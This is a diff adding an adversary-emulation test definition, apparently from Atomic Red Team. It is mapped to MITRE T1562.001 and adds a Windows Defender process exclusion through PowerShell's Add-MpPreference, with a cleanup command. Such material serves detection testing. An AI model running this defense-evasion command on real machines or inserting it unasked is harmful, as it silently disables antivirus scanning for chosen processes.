@@ -1,0 +1,31 @@
+{
+    "name": "Tamper with Windows Defender Evade Scanning -Process",
+    "description": "Malware can exclude specific processes from being scanned and evading detection. Upon successful execution, the process(es) should be on the list of excluded processes.  To check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$excludedProcess = \"#{excluded_process}\"\nAdd-MpPreference -ExclusionProcess $excludedProcess",
+        "cleanup_command": "$excludedProcess = \"#{excluded_process}\"\nRemove-MpPreference -ExclusionProcess  $excludedProcess\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1562.001",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Disable or Modify Tools",
+    "source": "ART",
+    "uuid": "a123ce6a-3916-45d6-ba9c-7d4081315c27",
+    "arguments": {
+        "excluded_process": {
+            "description": "A list of processes to exclude from scanning",
+            "type": "string",
+            "default": "outlook.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
